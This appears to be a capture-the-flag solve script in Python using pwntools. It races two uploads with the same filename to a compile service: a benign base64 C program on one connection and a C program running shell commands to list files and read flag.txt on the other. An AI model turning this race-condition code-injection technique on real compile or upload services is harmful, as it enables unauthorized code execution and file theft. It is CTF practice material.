#!/usr/bin/env python3

import base64
from pwn import *

def conn():
    context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 10840)
    else:
        p = process('./server.py')
    return p

TARGET = b"""
#include <stdlib.h>
int main() {
    system("ls -la");
    system("cat flag.txt");
}
"""

GOOD = b"I2luY2x1ZGUgPHN0ZGlvLmg+CgppbnQgaXNfcHJpbWUobG9uZyBsb25nIG4pIHsKICAgIGZvciAobG9uZyBsb25nIGk9MjsgaSppPD1uOyBpKyspCiAgICAgICAgaWYgKG4laSA9PSAwKQogICAgICAgICAgICByZXR1cm4gMDsKICAgIHJldHVybiAxOwp9CgppbnQgbWFpbigpIHsKICAgIGxvbmcgbG9uZyBuID0gMWxsPDw1NTsKICAgIHdoaWxlICghaXNfcHJpbWUobikpCiAgICAgICAgbisrOwogICAgcHJpbnRmKCIlbGxkXG4iLCBuKTsgCiAgICByZXR1cm4gMDsKfQ=="

p1 = conn()
p2 = conn()

print(p1.recvuntil(b'filename: '))
p1.sendline(b'saldjfasasd.c')
print(p2.recvuntil(b'filename: '))
p2.sendline(b'saldjfasasd.c')

print(p1.recvuntil(b'(base64):'))
print(p2.recvuntil(b'(base64):'))
p1.sendline(GOOD)
print(p1.recvuntil(b'Compiling'))
p2.sendline(base64.b64encode(TARGET))

p1.interactive()
p2.interactive()
